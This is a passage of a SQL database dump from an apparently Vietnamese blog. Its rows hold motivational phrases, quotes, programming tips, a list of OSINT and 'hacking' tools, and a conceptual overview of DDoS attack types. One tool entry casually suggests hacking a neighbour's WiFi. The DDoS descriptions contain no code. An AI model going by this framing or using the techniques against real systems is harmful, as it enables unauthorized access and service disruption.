(15, 'những câu tiếng anh hay', '', '1.You can do it!<br>\r\nbạn làm được mà<br><br>\r\n2.Try your best<br>\r\ncố hết sức nhé<br><br>\r\n3.At time goes by, everything will be better<br>\r\nthời gian trôi đi, mọi thứ sẽ tốt đẹp hơn<br><br>\r\n4.After rain comes sunshine<br>\r\nsau cơn mưa trời lại sáng<br><br>\r\n5.April showers bring May flowers<br>\r\nkhi giông tố qua đi cũng là lúc một sự khởi đầu tốt lành<br><br>\r\n6.Believe in yourself<br>\r\nhãy tin vào chính mình<br><br>\r\n7.Be brave, it will be ok<br>\r\nhãy dũng cảm, mọi việc sẽ ổn thôi<br><br>\r\n8.Come on, you can do it<br>\r\ncố lên,bạn có thể làm được mà<br><br>\r\n9.Chể up! = Lighten up!<br>\r\nhãy vui lên nào<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(16, '-- Nhà văn Victor Hugo --', '', '\"triệu chứng mạnh mẽ nhất của tình yêu là sự dịu dàng đôi lúc tới mức không chịu nổi.\"', '', 'admin', 0, '2024-06-29 06:25:21'),
(17, 'một số từ lóng của thế hệ game thủ 8x,9x', '', 'SAX<br>\r\nbắt nguồn từ trò chơi Boom Online. nhân vật bị trúng bom sẽ không chết ngay mà bị bọc trong bóng nước,gọi là sặc nước. Từ đó, câu cửa miệng \"sax\" đã ra đời như một từ cảm than trước một sự việc bất ngờ xảy ra<br><br>\r\n\r\nPHÁ ĐẢO<br>\r\nngày xưa chơi Contra, kết thúc game là cảnh hòn đảo nó bị nổ, kể từ đó mọi người quen dùng từ \"phá đảo\" để nói tới việc mình chơi xong một game<br><br>\r\n\r\nXANH<br>\r\nthời đó trong bản đồ DDay của Warcraft 3, những món đồ cộng chỉ số giúp tăng sức mạnh nhân vật có màu xanh, ngược lại là màu đỏ. Vì thế, người ta khi đó thường nói với nhau những từ đi kèm với từ \"xanh\" theo nghĩa là chưa xanh(chưa đủ mạnh)...', '', 'admin', 0, '2024-06-29 06:25:21'),
(18, 'Một số chanel youtube học lập trình web miễn phí và chất lượng', '', '1.FREECODECAMP:youtube.com/@freecodecamp<br><br>\r\n2.Traversy Media:youtube.com/@techguyweb\r\n<br><br>\r\n3.Programming with Mosh:youtube.com/@programmingwithmosh<br><br>\r\n4.Web dev simplified:youtube.com/@webdevsimplified<br><br>\r\n5.Fireship:youtube.com/@fireship<br><br>\r\n6.Clever Programmer:youtube.com/@cleverprogrammer\r\n<br><br>\r\n7.F8:youtube.com/@F8VNOfficial<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(19, 'Chia sẻ nâng tầm kiến thức', '', 'bạn có biết tại sao, trong tác phẩm nghệ thuật nổi tiếng của Michelangelo trên trần nhà nguyện Sistine ở Vatican, ngón tay của Thiên Chúa và Adam không chạm vào nhau không?<br><br>\r\nvâng, ngón tay của Chúa trong bức tranh này được vươn ra tối đa, nhưng ngón tay của Adam là điểm cuối. Chỉ cần Adam giương ngón tay lên là con người và Thiên Chúa chạm vào nhau.<br><br>\r\nngười ta giải thích rằng Chúa luôn ở đó,nhưng người quyết đinh đến gần Ngài hay không lại chính là con người. Nếu một người muốn chạm vào Thượng Đế, người đó sẽ muốn giương ngón tay của mình ra, nhưng bằng cách thu lại ngón tay, con người có thể sống cả đời mà không cần tìm kiếm thượng đế.<br><br>\r\nđiều này tượng trưng cho ý chí tự do của con người, họ có thể khước từ hoặc mở lòng để đón nhận Chúa.<br><br>\r\nđúng như thánh Augustino đã nói: \"chúa dựng nên con không cần có con, nhưng để cứu chuộc con, chúa cần sự cộng tác của con\".', '', 'admin', 0, '2024-06-29 06:25:21'),
(20, '-- Van Gogh --', '', '\"tôi mơ mình vẽ, và rồi tôi vẽ giấc mơ.\"', '', 'admin', 0, '2024-06-29 06:25:21'),
(21, 'trích\"về pháp quyền\"', '', '\"nghi phạm là một người chưa được chứng minh là phạm tội...Sẽ là bất công nghiêm trọng nếu tước đi, trong một khoảng thời gian đáng kể, quyền tự do của một người chưa và không hề có ý định phạm tội. Không quốc gia văn minh nào nên dung thứ cho những bất công như vậy.\"', '', 'admin', 0, '2024-06-29 06:25:21');
INSERT INTO `contentmembers` (`id`, `title`, `url`, `content`, `image`, `author`, `view_count`, `reg_date`) VALUES
(22, 'I Dont Regret a Mile(tôi không tiếc một dặm đường)', '', 'Tôi đã mơ nhiều giấc mơ chưa bao giờ trở thành sự thật<br>\r\nnhững giấc mơ tan biến lúc bình minh<br>\r\nnhưng đã có đủ những giấc mơ trở thành hiện thực<br>\r\nđể khiến tôi tiếp tục ước mơ<br>\r\nTôi đã cầu biết bao lời cầu nguyện, câu trả lời dường như không đến bao giờ<br>\r\ndù thật kiên nhẫn và chờ đợi rất lâu<br>\r\nnhưng câu trả lời đã đến đủ cho những lời cầu nguyện<br>\r\nđể khiến tôi tiếp tục nguyện cầu<br>\r\ntôi đã gieo và đánh rơi nhiều hạt giống trên đường<br>\r\nvà lũng đã bị lũ chim ăn mất<br>\r\nnhưng những bó lúa vàng trong tay tôi đã đủ<br>\r\nđể khiến tôi tiếp tục gieo mầm<br>\r\ntôi đã tin vào quá nhiều người bạn và đã bị bỏ rơi<br>\r\nrồi mặc tôi thổn thức một mình<br>\r\nnhưng tôi có đủ những người bạn chân thành, tri kỷ<br>\r\nđể khiến tôi tiếp tục giữ lòng tin<br>\r\ntôi đã cạn chén nỗi đau và thất vọng<br>\r\nvà trải qua bao ngày không một bài ca<br>\r\nnhưng tôi đã nhấp đủ mật ngọt từ những đóa hồng cuộc sống<br>\r\nđể khiến tôi khao khát sống nhiều hơn.<br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(23, 'những skills cho software engineer:', '', '1.thành thạo các ngôn ngữ lập trình phổ biến<br>\r\n2.khả năng viết và test code<br>\r\n3.có sự sáng tạo<br>\r\n4.những kỹ năng thuyết trình<br>\r\n5.làm quen với khả năng tương thích giữa các trình duyệt<br>\r\n6.thành thạo trong việc phát triển các thiết kế web đáp ứng<br>\r\n7.khả năng làm việc về phát triển ứng dụng front-end<br>\r\n8.kiến thức về thuật toán và cấu trúc dữ liệu<br>\r\n9.kỹ năng quản lý thời gian<br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(24, '-- Nhà triết học Plato --', '', '\"Nếu một người đàn ông bỏ bê học hành, anh ta sẽ đi khập khiễng đến cuối đời\"', '', 'admin', 0, '2024-06-29 06:25:21'),
(25, 'Có thể bạn không biết', '', 'Có thể bạn không tin, nhưng nếu dành 6 tháng tập trung hết mình để rèn luyện và làm việc có thể đẩy bạn vượt lên những người khác những 5 năm', '', 'admin', 0, '2024-06-29 06:25:21'),
(26, 'những câu tiếng anh hay', '', 'Dont worry, you will do well<br>\r\nđừng lo, bạn sẽ làm tốt thôi<br><br>\r\nIts okay. I know you can do it!<br>\r\nổn thôi mà. tớ biết cậu làm được mà<br><br>\r\nDont give up!<br>\r\nđừng bỏ cuộc<br><br>\r\nDo it your way<br>\r\nhãy làm theo cách của bạn<br><br>\r\nDont worry too much!<br>\r\nđừng lo lắng quá<br><br>\r\nDont break your heart<br>\r\nđừng có đau lòng<br><br>\r\nDont be discouraged<br>\r\nĐừng có chán nản<br><br>\r\nDo the best you can<br>\r\nthể hiện tốt nhất những gì bạn có thể nhé<br><br>\r\nDont cry because you did try your best<br>\r\nđừng khóc vì bạn đã cố gắng hết mình rồi<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(27, 'những câu tiếng anh hay', '', 'Every cloud has a silver lining<br>\r\ntrong cái rủi còn có cái may<br><br>\r\nEverything will be fine<br>\r\nmọi việc rồi sẽ ổn thôi<br><br>\r\nGive it your best shot<br>\r\nCố hết sức mình đi<br><br>\r\nGo on, you can do it!<br>\r\ntiến lên, bạn làm được mà<br><br>\r\nDo it again<br>\r\nlàm lại lần nữa xem<br><br>\r\nGo for it!<br>\r\ncứ làm đi/ theo đuổi nó đi<br><br>\r\nGive it a try/ Give it a Shot<br>\r\ncứ thử xem sao<br><br>\r\nbetter try than regret<br>\r\nthà cố còn hơn tiếc nuối<br><br>\r\ngive it your best shot<br>\r\ncố hết sức mình đi<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(28, 'những câu tiếng anh hay', '', 'Give it your best shot<br>\r\ncố gắng hết mình vì việc đó xem<br><br>\r\nhow matter you are so good at working<br>\r\ndù thế nào đi nữa thì bạn đã làm rất tốt<br><br>\r\nI trust you<br>\r\ntôi tin bạn<br><br>\r\nI totally believe in you<br>\r\ntôi rất tin tưởng ở bạn<br><br>\r\nI`m sure you can do it<br>\r\ntôi chắc chắn bạn có thể làm được<br><br>\r\nI will help if necessary<br>\r\ntôi sẽ giúp nếu cần thiết<br><br>\r\nI am always be by your side<br>\r\ntôi luôn ở bên cạnh bạn<br><br>\r\nWhenever you need, l`ll be there<br>\r\nkhi nào bạn cần, tôi sẽ ở bên bạn<br><br>\r\nDont worry. Relax<br>\r\nđừng lo lắng. thư giãn đi<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(29, 'Phát triển trò chơi', '', 'Javascript cũng được sử dụng để phát triển trò chơi.<br><br>\r\ncác thư viện javascript khác nhau như three.js, TweenMax có thể được sử dụng để tạo các trò chơi trên trình duyệt<br><br>\r\ncác công cụ và thư viện trò chơi js phổ biến khác là GDevelop, MelonJS, ImpactJS,BAbylonJS,PhaserJS,PixiJS,PlayCanvas,A-Frame.<br><br>\r\nmột số thư viện thậm chí còn cho phép bạn xuất trò chơi của mình sang các nền tảng khác nhau như Android, iOS,vv...<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(30, '-- ngạn ngữ --', '', '\"Hãy tìm một điều gì đó bạn thích đến mức bạn có thể vui vẻ thực hiện nó mà không đòi hỏi gì cả, nếu bạn học cách có thể làm tốt nó, một ngày nào đó có người sẽ vui vẻ trả công cho bạn.\"', '', 'admin', 0, '2024-06-29 06:25:21'),
(31, 'tools hacking', '', '1. Shodan<br><br>\r\n\r\nShodan là công cụ tìm kiếm các thiết bị mở trên internet, chẳng hạn như máy chủ và thiết bị IoT. Đây là các thiết bị mà bạn có thể truy cập công khai. Nếu thiết bị được kết nối với internet mà không được cấu hình bảo mật cẩn thận, thì bạn có thể tìm thấy thiết bị đó thông qua Shodan.<br><br>\r\n\r\nPhiên bản Shodan miễn phí sẽ giới hạn số lượng kết quả. Vậy nên phiên bản trả phí sẽ hữu ích hơn rất nhiều nếu bạn cần tìm các máy chủ, thiết bị mạng và thiết bị ngoại vi IoT (chẳng hạn như camera).<br><br>\r\n\r\n2. Maltego<br><br>\r\n\r\nMaltego có sẵn trên Windows, Mac và Linux, cho phép người dùng truy cập vào nhiều nguồn dữ liệu cho mục đích OSINT, nghiên cứu dữ liệu và pháp y số. Có hơn 58 nguồn dữ liệu trong Maltego bao gồm Google Maps, AlienVault OTX, ATII Hades Darkweb Intelligence, Blockchain.info, Crowdstrike, VirusTotal,…<br><br>\r\n\r\nGiá trị mà Maltego mang lại cho các bạn không chỉ nằm ở các nguồn dữ liệu khổng lồ mà còn là các mẫu và xu hướng dữ liệu thông qua hình ảnh trực quan. Tất nhiên, tất cả các tính năng của Maltego không phải là miễn phí, nhưng mình nghĩ phiên bản Maltego Community Edition là đủ dùng cho người mới rồi.<br><br>\r\n\r\n3. Google Dorks <br><br>\r\n\r\nGoogle Dork không phải là một ứng dụng, mà nó là một kỹ thuật sử dụng Google. Mặc dù nó không phải là ứng dụng, nhưng có những nhà phát triển đã phát triển các công cụ phần mềm mã nguồn mở cho Google Dorking mà bạn có thể thử, chẳng hạn như Pagodo và GoogleDorker. <br><br>\r\n\r\nHầu hết mọi người chỉ nhập các chuỗi từ khoá vào Google, chẳng hạn như “thời tiết Vietnam” hoặc “anonyviet”. Nhưng có một số toán tử tìm kiếm mà bạn có thể sử dụng trong Google. Ví dụ: bạn có thể thử “site:anonyviet.com” để tìm kiếm nội dung trong website anonyviet hoặc sử dụng dấu ngoặc kép xung quanh cụm từ tìm kiếm để chỉ trả về kết quả chứa chính xác từ đó. Bạn có thể xem thêm danh sách các toán tử của Google Dork tại đây. <br><br>\r\n\r\nRất nhiều trang web được cấu hình bảo mật rất kém. Các bot thu thập dữ liệu của Google truy cập các trang web này để tìm kiếm nội dung. Vì vậy, Google Dorking có thể là một kỹ thuật hữu ích để bạn tìm các dữ liệu như địa chỉ email, thông tin đăng nhập và số điện thoại chưa được bảo mật đúng cách.<br><br>\r\n\r\n4. Recon-ng<br><br>\r\n\r\nRecon-ng là công cụ trinh sát web mã nguồn mở. Sức mạnh của nó nằm ở việc bạn có thể cài đặt thêm các module vào công cụ này. Nếu bạn sử dụng Recon-ng một cách hiệu quả, bạn có thể tiết kiệm rất nhiều thời gian trong công việc OSINT của mình. <br><br>\r\n\r\nRecon-ng có thể chạy từ terminal. Nếu bạn muốn tăng thêm sức mạnh cho Recon-ng, hãy chọn Marketplace từ menu chính và cài đặt những module bạn muốn.<br><br>\r\n\r\n5. Ahmia.fi <br><br>\r\n\r\nAhmia.fi là công cụ tìm kiếm dành riêng cho việc tìm kiếm các trang web trên Mạng Tor, mặc dù bản thân công cụ tìm kiếm này có thể truy cập được trên “clearnet”. Nhưng bạn sẽ cần Trình duyệt Tor để mở kết quả tìm kiếm của mình. <br><br>\r\n\r\nRất nhiều chợ đen và diễn đàn trên Mạng Tor, vì vậy việc sử dụng Ahmia.fi hiệu quả sẽ giúp cho công việc điều tra OSINT của bạn.<br><br>\r\n\r\n6. Wayback Machine <br><br>\r\n\r\nWayback Machine là một công cụ tìm kiếm của hơn 632 tỷ trang web, gồm rất nhiều trang đã có từ những năm 1990. <br><br>\r\n\r\nArchive.org đang sử dụng Wayback Machine để lưu trữ càng nhiều trang web càng tốt. Bạn cũng có thể sử dụng trang web của họ để lưu trữ các trang web hiện đang trực tuyến theo cách thủ công. Nếu các web này bị xóa hoặc sập, bạn có thể tìm thấy một bản sao của chúng được lưu trữ trong Wayback Machine.<br><br>\r\n\r\n7. theHarvester <br><br>\r\n\r\ntheHarvester là công cụ trinh sát mã nguồn mở hữu ích khác mà bạn có thể cài đặt từ GitHub. Nó có thể được sử dụng để thu thập địa chỉ email, máy chủ, tên miền phụ, tên nhân viên và port từ nhiều nguồn công khai khác nhau như công cụ tìm kiếm, PGP và Shodan. <br><br>\r\n\r\nBạn có thể dễ dàng chạy theHarvester từ dòng lệnh của mình. Công cụ này có một bộ tùy chọn đặc biệt để bạn khám phá dữ liệu trong máy chủ DNS. Máy chủ DNS có rất nhiều thông tin hữu ích vì chúng liên kết tên miền với địa chỉ IP cụ thể. <br><br>\r\n\r\nMột số nguồn dữ liệu mà bạn có thể khám phá cùng với theHarvester gồm LinkedIn, Bing, Google và VirusTotal.<br><br>\r\n\r\n8. TinEye <br><br>\r\n\r\nTinEye là công cụ mạnh mẽ để phân tích hình ảnh. Nếu bạn có một tấm ảnh trên thiết bị của mình, bạn có thể tải nó lên TinEye và xem liệu tấm ảnh đó có đang được sử dụng trên web khác hay không. <br><br>\r\n\r\nCác trường hợp sử dụng cụ thể: Tìm thông tin của người khác từ ảnh chụp của họ, địa điểm chụp bức ảnh hoặc ứng dụng dùng để chụp ảnh.<br><br>\r\n\r\n9. OSINT Framework <br><br>\r\n\r\nOSINT Framework là ứng dụng web hoàn hảo nếu bạn không chắc mình sẽ cần sử dụng nguồn dữ liệu OSINT nào để tìm thông tin mình muốn. OSINT Framework cung cấp cho bạn các nguồn dữ liệu tiềm năng mà bạn có thể sử dụng. <br><br>\r\n\r\nBạn có thể phân tích tệp độc hại, tên người dùng, vị trí địa lý, địa chỉ IP, tên miền, IRC, Dark Web, big data, thông tin về mối đe dọa, số điện thoại hoặc nhiều thông tin khác nữa bằng công cụ này. OSINT Framework có thể là bước đầu tiên trong hành trình OSINT của bạn.<br><br>\r\n\r\n10. Thư viện <br><br>\r\n\r\nNguồn dữ liệu ngoại tuyến tốt nhất là thư viện. Bạn có thể đến thư viện, hoặc trang web của thư viện có thể giúp bạn trực tiếp tìm thấy thông tin mà bạn đang cần. <br><br>\r\n\r\nCó rất nhiều thông tin chưa được số hoá tại thư viện như tạp chí, báo và danh bạ. Tại Hồ Chí Minh thì bạn có thể đến thư viện Khoa học tổng hợp. Đăng ký thẻ thành viên và bạn có thể ở cả ngày trong thư viện. Mình hay vô đây để chạy deadline nữa đấy :v.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(32, 'Tool Hack', '', '1. wigle.net <br><br>\r\n\r\nWigle tổng hợp vị trí và thông tin của các mạng Wifi trên toàn thế giới vào một cơ sở dữ liệu trung tâm.<br><br>\r\nWigle có một ứng dụng web và PC dành cho người dùng có thể lập bản đồ, truy vấn và cập nhật cơ sở dữ liệu. <br><br>\r\nWigle có thể giúp bạn theo dõi WIFI xung quanh bạn và thông tin chi tiết về mạng Wifi; điều này tương đối tuyệt vời nếu bạn có ý định hack WIFI của hàng xóm hoặc quán cafe nào đó. <br><br>\r\nXem các bài viết về Hack Wifi trên AnonyViet.<br><br>\r\n\r\n2. Hunter.io <br><br>\r\nHunter.io hoạt động bằng cách tìm kiếm và lập chỉ mục email trên các trang web của công ty trên internet . Hunter.io sẽ ghi lại các mẫu email phổ biến mà nó tìm thấy, nó giống như một danh bạ Email, bạn có thể tận dụng Hunter.io để OSINT tìm thông tin của bất kỳ ai hoặc công ty nào trên thế giới. <br><br>\r\nĐây là Công cụ tìm kiếm Hacker thường dùng để điều tra một công ty nào đó, Chỉ cần gõ Domain bất kỳ, nó sẽ liệt kê các Email có liên quan đến Domain đó.<br><br>\r\nNgười tìm việc cũng có thể sử dụng tính năng này để nhận email từ công ty mà họ định gửi Cv, điều này có thể rất thú vị.<br><br>\r\n\r\n3. Vulners.com<br><br>\r\nVulners.com là công cụ tìm kiếm lưu trữ cơ sở dữ liệu liên quan đến các lỗ hổng bảo mật đã được công bố trên thế giới. vulners.com thu thập các bản tin/bài báo mới nhất về bảo mật từ các Website, diễn đàn bảo mật, danh sách các lỗ hổng được các nhà nghiên cứu tìm thấy, nội dung của lỗ hổng và cách khai thác lỗ hổng từ các bài đăng trên các diễn đàn hack và thậm chí từ chức năng Scan của Vulners.com. Nó cũng hướng dẫn cho bạn cách  để tấn công hệ thống thông qua tên lỗ hổng được tìm thấy..<br><br>\r\nHơn nữa, bạn tự động hóa quá trình tìm kiếm với Vulners Search API. tài khoản miễn phí được 100 Credit/tháng.<br><br>\r\n\r\n4. pentest-tools.com <br><br>\r\npentest-tools.com là công cụ quét lỗ hổng bảo mật Online, sử dụng hơn 20 công cụ để trinh sát, phát hiện lỗ hổng bảo mật và các hoạt động bảo mật tấn công.<br><br>\r\nBạn có thể dùng công cụ này để kiểm tra bảo mật cho website hoặc hệ thống mạng trên trang Web này. Chỉ nhập đường link và chọn kiểu lỗ hổng cần quét nhưu SQL Injection, XSS, Server Side-Request Forgery, Directory Traversal… hoặc quét nhanh toàn bộ hệ thống. Chỉ cần treo link đó và chờ kết quả.<br><br>\r\nCông cụ kiểm tra bảo mật ứng dụng web này chạy các kiểm tra bảo mật trang web toàn diện để phát hiện Log4Shell, OWASP Top 10 và các lỗ hổng có nguy cơ cao. Bạn sẽ nhận được bản báo cáo với các lỗ hổng được tìm thấy để lên phương án sửa chữa hoặc tấn công kiểm thử.<br><br>\r\n\r\n5. Searchcode.com <br><br>\r\nSearchcode.com giúp bạn tìm mã code và các ví dụ về code đó trên Internet, kết quả sẽ trả về các hàm, API và thư viện bằng 243 ngôn ngữ trên hơn 10 mã trên Internet.<br><br>\r\nTừ đó các Pentester, Hacker có thể nghiên cứu mã để tìm ra sơ hở của các lập trình viên. Tuy nhiên, đối với người mới bắt đầu, điều này có thể hơi phức tạp và tốn khá nhiều thời gian.<br><br>', '', 'admin', 0, '2024-06-29 06:25:21'),
(33, '25 kiểu tấn công DDoS Hacker thường dùng.', '', 'Nhắc tới DDoS chắc có lẽ anh em đã quá quen thuộc nên không cần phải copy lại mấy khái niệm làm gì tất cả đều có trên google seach hoặc anh em có thể tham khảo tại đây.<br><br>\r\n\r\nBài viết giới thiệu các kiểu tấn công DDoS phổ biến có nhiều kiểu tấn công đã được fix – nguồn từ các tạp chí an ninh mạng khác trên thế giới.<br><br>\r\n\r\nHạ tầng công nghệ thông tin đang gặp những hạn chế về hay cơ sở hạ tầng không đủ mạnh để chống đỡ các cuộc tấn công DDoS. Nếu bạn có một trang web chạy trên hàng ngìn server với băng thông TB/s thì chắc không cần các giải pháp chống tấn công DDoS làm gì.<br><br>\r\n\r\nDưới đây là 25 kiểu tấn công DDoS Hacker hay sử dụng để đánh sập bất kỳ website nào.<br><br>\r\n\r\n1.NTP Flood (NTP Amplification)<br><br>\r\n<img src=\"Imageass/1.jpg\"><br><br>\r\nNetwork Time Protocol (NTP), một trong những giao thức mạng lâu đời nhất được giao nhiệm vụ đồng bộ hóa thời gian giữa các hệ thống điện tử là cốt lõi của DDoS attack vector. Cách thức thực hiện là khai thác lỗ hổng các máy chủ NTP có thể truy cập công khai để làm quá tải mạng đích với số lượng lớn các gói UDP.<br><br>\r\n\r\n2. Fraggle Attack<br><br>\r\n\r\nKỹ thuật DDoS này về logic tương tự như Smurf Attack, ngoại trừ việc nó tấn công nạn nhân dự định bằng nhiều gói UDP thay vì các gói tin ICMP request.<br><br>\r\n\r\n3. SYN-ACK Flood<br><br>\r\n\r\nTheo logic đây là kiểu tấn công vector lợi dụng giao tiếp TCP trong đó máy chủ tạo ra gói tin SYN-ACK để xác nhận yêu cầu của user. Để thực hiện tấn công Hacker đã làm quá tải tài nguyên CPU RAM của máy chủ bằng cách gửi các gói tin SYN-ACK giả mạo.<br><br>\r\n\r\n4. ACK & PUSH ACK Flood<br><br>\r\n\r\nGiao thức TCP yêu cầu giao thức bắt tay ba bước khi thiết lập kết nối giữa máy chủ và máy khách các gói ACK hoặc PUSH ACK được gửi qua lại cho đến khi phiên làm việc kết thúc. Máy chủ bị tấn công dạng này sẽ không thể xác định nguồn gốc của các gói tin bị làm sai lệch địa chỉ và máy chủ lúc đó sẽ lãng phí khả năng xử lý khi cố gắng xác định cách xử lý chúng.<br><br>\r\n\r\n5. Fragmented ACK Flood<br><br>\r\n\r\nCuộc tấn công này là một knockoff của kỹ thuật ACK & PUSH ACK Flood đã đề cập ở trên. Nó tập trung vào việc xóa một mạng đích với số lượng gói ACK bị phân mảnh tương đối nhỏ, có kích thước tối đa được phép, thường là 1500 byte mỗi gói. Các thiết bị mạng như bộ định tuyến cũng sẽ hết tài nguyên khi cố gắng lắp ráp lại các gói này. Hơn nữa, các gói bị phân mảnh có thể vượt qua radar của các hệ thống ngăn chặn xâm nhập (IPS) và Firewall.<br><br>\r\n\r\n6. Spoofed Session Flood (Fake Session Attack)<br><br>\r\n\r\nĐể phá vỡ các công cụ bảo vệ hệ thống mạng như Firewall chả hạn, Hacker có thể giả mạo phiên TCP hiệu quả hơn bằng cách gửi gói SYN giả mạo, một loạt các gói ACK và ít nhất một gói RST (reset hoặc FIN (connection termination). Chiến thuật này cho phép Hacker lừa hệ thống phòng thủ chỉ giữ các tab trên lưu lượng truy cập đến thay vì phân tích lưu lượng truy cập trở lại.<br><br>\r\n\r\n7. UDP Flood<br><br>\r\n<img src=\"Imageass/7.jpg\"><br><br>\r\nUDP (User Datagram Protocol) là một giao thức kết nối không tin cậy. Một cuộc tấn công gây ngập băng thông UDP có thể được bắt đầu bằng cách gửi một số lượng lớn các gói tin UDP tới cổng ngẫu nhiên trên một máy chủ từ xa và kết quả là các máy chủ sẽ:<br><br>\r\n• Kiểm tra các ứng dụng với cổng.<br><br>\r\n• Thấy rằng không có ứng dụng nghe ở cổng.<br><br>\r\n• Trả lời với một gói ICMP Destination Unreachable.<br><br>\r\nKhi số lượng request vượt ngưỡng này sẽ đẫn đến mất khả năng sử lý các yêu cầu của khách hàng thông thường đẫn đến tình trạng từ chối dịch vụ.<br><br>\r\nUDP là một giao thức không duy trì trạng thái, và trong các gói tin UDP sẽ có thông nguồn IP máy chủ dịch phản hồi yêu cầu. Lợi dụng đặc tính này hacker không sử dụng IP thật mà sẽ thay thế bằng IP giả. Trường hợp này sẽ rất khó để xác định được nguồn tấn công thực sự.<br><br>\r\n\r\n8. DNS Flood<br><br>\r\n\r\nĐây là một biến thể của UDP Flood mục tiêu tập trung vào các máy chủ DNS. Hakcer tạo ra một loạt các gói yêu cầu DNS giả giống như các gói hợp pháp bắt nguồn từ một số lượng lớn các địa chỉ IP khác nhau. DNS Flood là một trong những kiểu tấn công từ chối dịch vụ khó nhất để ngăn chặn và khôi phục.<br><br>\r\n\r\n9. VoIP Flood<br><br>\r\n\r\nĐây là một hình thức phổ biến của UDP Flood nhắm vào máy chủ \"giao thức thoại\" qua giao thức Internet (VoIP). Vô số các yêu cầu VoIP không có thật được gửi từ nhiều địa chỉ IP làm cạn kiệt tài nguyên của máy chủ nạn nhân khiến dịch vụ VoIP bị đình trệ (từ chối dịch vụ).<br><br>\r\n\r\n10. SYN Flood<br><br>\r\n\r\nCuộc tấn công này khai thác giao thức bắt tay ba bước TCP, một kỹ thuật được sử dụng để thiết lập bất kỳ kết nối nào giữa client với server. Thông thường client gửi một message SYN (đồng bộ hóa) đến máy chủ để yêu cầu kết nối.<br><br>\r\nKhi một cuộc tấn công SYN Flood diễn ra, Hacker sẽ gửi rất nhiều message từ một địa chỉ IP giả mạo. Kết quả là server không còn khả năng xử lý vì lưu trữ rất nhiều gói SYN và xảy ra tình trạng từ chối dịch vụ cho các client thực.<br><br>\r\n\r\n11. CHARGEN Flood<br><br>\r\n<img src=\"Imageass/11.jpg\"><br><br>\r\nTương tự như NTP, Giao thức Character Generator Protocol (CHARGEN) là một giao thức cũ có xuất hiện từ những năm 1980. Mặc dù vậy nó vẫn đang được sử dụng trên một số thiết bị được kết nối như máy in và máy photocopy. Cuộc tấn công bắt nguồn từ việc gửi các gói tin nhỏ đã bị sửa đổi IP thành IP máy chủ nạn nhân đến các thiết bị có bật giao thức CHARGEN kết quả là các thiết bị nhận được gói tin giả mạo kia có kết nối với Internet sẽ gửi các gói UDP đến máy chủ nạn nhân do đó làm cạn kiệt tài nguyên dẫn đến tình trạng từ chối dịch vụ.<br><br>\r\n\r\n12. SSDP Flood<br><br>\r\n\r\nHacker có thể khai thác các thiết bị được kết nối mạng chạy các dịch vụ Universal Plug and Play (UPnP) để thực hiện một cuộc tấn công DDoS dựa trên giao thức khám phá dịch vụ đơn giản (SSDP). Mặt khác, SSDP được nhúng trong khung giao thức UPnP. Kẻ tấn công gửi các gói UDP nhỏ có địa chỉ IP giả mạo của máy chủ nạn nhân đến nhiều thiết bị chạy UPnP kết quả máy chủ nạn nhân quá tải dẫn đến tình trạng từ chối dịch vụ.<br><br>\r\n\r\n13. SNMP Flood (SNMP Amplification)<br><br>\r\n\r\nSimple Network Management Protocol) là một tập hợp các giao thức không chỉ cho phép kiểm tra các thiết bị mạng như router, switch hay server có đang vận hành mà còn hỗ trợ vận hành các thiết bị này một cách tối ưu, ngoài ra SNMP còn cho phép quản lý các thiết bị mạng từ xa.\r\nHacker tấn công một máy chủ mục tiêu, bộ chuyển mạch hoặc bộ định tuyến với nhiều gói nhỏ đến từ một địa chỉ IP giả mạo.<br><br>\r\nKhi ngày càng có nhiều thiết bị đang lắng nghe và trả lời địa chỉ giả mạo đó lúc ấy hệ thống mạng không đủ khả năng xử lý các phản hồi này và dẫn đến tình trạng từ chối dịch vụ.<br><br>\r\n\r\n14. HTTP Flood<br><br>\r\n<img src=\"Imageass/14.png\"><br><br>\r\nKhi thực hiện một cuộc tấn công DDoS HTTP Flood, Hacker sẽ gửi các yêu cầu GET hoặc POST hợp pháp đến máy chủ hoặc ứng dụng web và tiêu tốn hầu hết hoặc tất cả các tài nguyên của nó. Kỹ thuật này thường liên quan đến các botnet được tạo ra bởi Hacker trước đó bằng cách lây nhiễm các phần mềm độc hại.<br><br>\r\n\r\n15. Recursive HTTP GET Flood<br><br>\r\n\r\nĐể duy trì cuộc tấn công, Hacker tạo những request tới tất cả đường link của website của máy chủ sau đó kiểm tra các câu trả lời và lặp lại yêu cầu mọi đường link của trang web để làm cạn kiệt tài nguyên của máy chủ. Việc khai thác trông giống như các truy vấn hợp pháp và có thể khó xác định để ngăn chặn tấn công kiểu này.<br><br>\r\n\r\n16. ICMP Flood<br><br>\r\n\r\nCòn được gọi là Ping Flood, cuộc tấn công này nhằm mục đích làm quá tải sức xử lí của máy chủ hoặc thiết bị mạng khác với nhiều giao thức Message Protocol (ICMP) hoặc pings.Các thiết bị trên nhận được một số lượng ping ICMP nhất định và mạng phản hồi với cùng số gói trả lời. Vì khả năng đáp ứng này là hữu hạn nên mạng sẽ sớm rơi vào tình trạng từ chối dịch vụ.<br><br>\r\n\r\n17. Misused Application Attack<br><br>\r\n\r\nThay vì sử dụng địa chỉ IP giả mạo, cuộc tấn công này ký sinh trên các máy khách hợp pháp chạy các ứng dụng sử dụng nhiều tài nguyên như công cụ P2P. Hacker sẽ bẻ cong sự định tuyến lưu lượng truy cập từ các máy khách này đến máy chủ nạn nhân khiến nó bị tải quá. Kỹ thuật DDoS này khó ngăn chặn vì lưu lượng truy cập bắt nguồn từ các máy khách thực trước đây đã bị Hakcer xâm nhập.<br><br>\r\n\r\n18. IP Null Attack<br><br>\r\n\r\nKiểu tấn công này được thực hiện bằng cách gửi một loạt các gói tin chứa các IPv4 headers không hợp lệ. Thủ thuật là Hacker sẽ để giá trị headers NULL. Một số máy chủ không thể xử lý các gói tin hỏng này đúng cách và lãng phí tài nguyên của chúng khi cố gắng tìm cách xử lý chúng dẫn đến tình trạng từ chối dịch vụ.<br><br>\r\n\r\n19. Smurf Attack<br><br>\r\n\r\nAttacker gửi gói tin ICMP echo request với địa chỉ đích là địa chỉ broadcast (của một mạng 